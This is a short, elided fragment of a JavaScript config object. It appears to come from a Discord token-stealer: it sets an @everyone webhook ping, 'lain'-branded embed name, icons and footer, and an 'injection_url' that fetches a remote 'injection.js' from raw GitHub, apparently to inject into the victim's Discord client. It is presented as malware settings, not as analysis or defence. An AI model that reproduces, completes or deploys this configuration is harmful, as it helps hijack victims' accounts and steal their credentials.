...
const config = {
  ...
  ping_val: '@everyone',
  embed_name: 'lain ★', 
  embed_icon: 'https://pomf2.lain.la/f/35n4z4xp.jpg'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/bGFpbglain/index/main/injection.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
            text: 'lain・@lxfd',
            icon_url: "https://pomf2.lain.la/f/zsi1kbmy.jpg"
        },
      },
    ],
  };
